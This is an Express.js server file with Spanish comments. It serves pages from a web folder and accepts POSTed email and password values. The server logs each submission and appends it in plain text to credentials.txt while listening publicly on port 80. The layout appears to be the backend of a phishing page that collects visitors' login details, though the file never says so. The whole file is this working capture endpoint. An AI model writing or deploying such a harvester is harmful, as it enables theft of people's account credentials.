const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = 80;

// Middleware para leer JSON del cuerpo de la petición
app.use(express.json());

// Servir archivos estáticos (HTML, JS, CSS) desde carpeta web
app.use('/', express.static(path.join(__dirname, '../../web')));

// Ruta para manejar POST desde script.js
app.post('/api/datos', (req, res) => {
    const datos = req.body;
    console.log('Datos recibidos:', datos);

    const filePath = path.join(__dirname, 'credentials.txt');

    if (!datos.email && !datos.password) {
        return res.status(400).json({
            success: false,
            mensaje: 'No se recibieron datos válidos'
        });
    }

    const contenido = datos.email || datos.password;

    fs.appendFile(filePath, contenido + '\n', (err) => {
        if (err) {
            console.error('Error al guardar:', err);
            return res.status(500).json({ success: false, mensaje: 'Error al guardar' });
        }

        res.json({
            success: true,
            mensaje: 'Datos guardados correctamente',
            datos
        });
    });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Servidor corriendo en http://localhost:${PORT}`);
});
